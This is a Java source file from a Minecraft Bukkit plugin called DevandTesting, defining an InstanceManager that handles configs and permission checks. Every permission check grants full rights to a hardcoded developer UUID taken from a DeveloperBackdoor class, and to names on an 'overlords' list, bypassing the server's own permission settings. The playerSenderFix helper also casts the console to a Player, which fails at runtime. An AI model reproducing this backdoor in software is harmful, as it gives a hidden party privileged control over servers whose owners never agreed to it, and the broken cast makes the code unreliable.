package com.tylerhyperhd.devandtesting;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import com.tylerhyperhd.devandtesting.InsaneBranch.InsaneMode;

public class InstanceManager {
	private DevandTesting plugin;
	private String version;
	private DevLogger logger;
	private ConfigLoader configs;
	private InsaneMode iMode;

	/**
	 * 
	 * @param plugin
	 */
	public InstanceManager(DevandTesting plugin) {
		this.plugin = plugin;
		this.version = plugin.getDescription().getVersion();
		this.logger = new DevLogger(this);
	}

	/**
	 * 
	 * 
	 */
	public void initializeConfigs() {
		this.configs = new ConfigLoader(this);
	}

	/**
	 * 
	 * @return
	 */
	public DevandTesting getPlugin() {
		return this.plugin;
	}

	/**
	 * 
	 * @return
	 */
	public ConfigLoader getConfigs() {
		return this.configs;
	}

	/**
	 * 
	 * @return
	 */
	public String getVersion() {
		return this.version;
	}

	/**
	 * 
	 * @return
	 */
	public DevLogger getLogger() {
		return this.logger;
	}

	/**
	 * 
	 * @return
	 */
	public InsaneMode getInsaneMode() {
		return this.iMode;
	}

	/**
	 * 
	 */
	public void initializeInsaneMode() {
		this.iMode = new InsaneMode(this);
	}

	/**
	 * 
	 */
	public void cleanupInsaneMode() {
		this.iMode.runDisableTasks();
	}

	/**
	 * Figures out console issues
	 * 
	 * @param sender The sender of the command.
	 * @return The sender of the command.
	 */
	public Player playerSenderFix(CommandSender sender) {
		if (this.senderIsConsole(sender)) {
			return (Player) Bukkit.getConsoleSender();
			
		} else {
			return (Player) sender;
		}
	}

	/**
	 * Figures out if the sender is the server console.
	 * 
	 * @param sender The sender of the command.
	 * @return If sender is console.
	 */
	public boolean senderIsConsole(CommandSender sender) {
		return !(sender instanceof Player);
	}

	/**
	 * Decides if the sender doesn't have permission to execute the command.
	 * 
	 * @param type   The type of permission being questioned.
	 * @param sender The sender of the command.
	 * @return Returns true if the sender has no perms to the command.
	 */
	public boolean hasNoPermsTo(PermType type, CommandSender sender) {
		if (this.senderIsConsole(sender)) {
			return false;
		} else if (((Player) sender).getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
				|| this.getConfigs().getOverlords().contains(sender.getName())) {
			return false;
		} else if (type.equals(PermType.ADMIN)) {
			return !(sender.hasPermission("devandtesting.admin"));
		} else if (type.equals(PermType.COLOR)) {
			return !(sender.hasPermission("devandtesting.color"));
		} else if (type.equals(PermType.ADMIN_OTHERS)) {
			return !(sender.hasPermission("devandtesting.admin.others"));
		} else if (type.equals(PermType.INSANE)) {
			return !(sender.hasPermission("devandtesting.insane"));
		} else {
			return false;
		}
	}

	/**
	 * Decides if the player doesn't have permission to execute the command.
	 * 
	 * @param type   The type of permission being questioned.
	 * @param player The player being questioned.
	 * @return Returns true if the player has no perms to the command.
	 */
	public boolean hasNoPermsTo(PermType type, Player player) {
		if (player.getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
				|| this.getConfigs().getOverlords().contains(player.getName())) {
			return false;
		} else if (type.equals(PermType.ADMIN)) {
			return !(player.hasPermission("devandtesting.admin"));
		} else if (type.equals(PermType.COLOR)) {
			return !(player.hasPermission("devandtesting.color"));
		} else if (type.equals(PermType.ADMIN_OTHERS)) {
			return !(player.hasPermission("devandtesting.admin.others"));
		} else if (type.equals(PermType.INSANE)) {
			return !(player.hasPermission("devandtesting.insane"));
		} else {
			return false;
		}
	}

	/**
	 * Decides if the sender does have permission to execute the command.
	 * 
	 * @param type   The type of permission being questioned.
	 * @param sender The sender being questioned.
	 * @return Returns true if the sender has permission to use the command.
	 */
	public boolean doesHavePermsTo(PermType type, CommandSender sender) {
		if (this.senderIsConsole(sender)) {
			return true;
		} else if (((Player) sender).getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
				|| this.getConfigs().getOverlords().contains(sender.getName())) {
			return true;
		} else if (type.equals(PermType.ADMIN)) {
			return sender.hasPermission("devandtesting.admin");
		} else if (type.equals(PermType.COLOR)) {
			return sender.hasPermission("devandtesting.color");
		} else if (type.equals(PermType.ADMIN_OTHERS)) {
			return sender.hasPermission("devandtesting.admin.others");
		} else if (type.equals(PermType.INSANE)) {
			return sender.hasPermission("devandtesting.insane");
		} else {
			return false;
		}
	}

	/**
	 * Decides if the player does have permission to execute the command.
	 * 
	 * @param type   The type of permission being questioned.
	 * @param player The player being questioned.
	 * @return Returns true if the player has permission to use the command.
	 */
	public boolean doesHavePermsTo(PermType type, Player player) {
		if (player.getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
				|| this.getConfigs().getOverlords().contains(player.getName())) {
			return true;
		} else if (type.equals(PermType.ADMIN)) {
			return player.hasPermission("devandtesting.admin");
		} else if (type.equals(PermType.COLOR)) {
			return player.hasPermission("devandtesting.color");
		} else if (type.equals(PermType.ADMIN_OTHERS)) {
			return player.hasPermission("devandtesting.admin.others");
		} else if (type.equals(PermType.INSANE)) {
			return player.hasPermission("devandtesting.insane");
		} else {
			return false;
		}
	}

	/**
	 * 
	 * @param commandNames
	 * @param file
	 */
	public void registerMultipleCommands(String[] commandNames, CommandExecutor file) {
		for (String cmdname : commandNames) {
			this.getPlugin().getCommand(cmdname).setExecutor(file);
		}
	}
}
